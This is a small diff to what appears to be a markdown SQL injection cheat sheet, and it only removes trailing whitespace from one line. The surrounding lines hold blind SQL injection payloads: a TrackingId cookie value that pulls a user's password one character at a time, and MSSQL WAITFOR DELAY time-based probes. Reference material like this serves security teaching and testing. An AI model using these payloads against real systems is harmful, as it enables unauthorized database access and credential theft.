@@ -189,7 +189,7 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 * Triggering time delays depending on whether an injected condition is true or false
 
 ```
-'; IF (1=2) WAITFOR DELAY '0:0:10'--    
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
 '; IF (1=1) WAITFOR DELAY '0:0:10'--
 ```
 
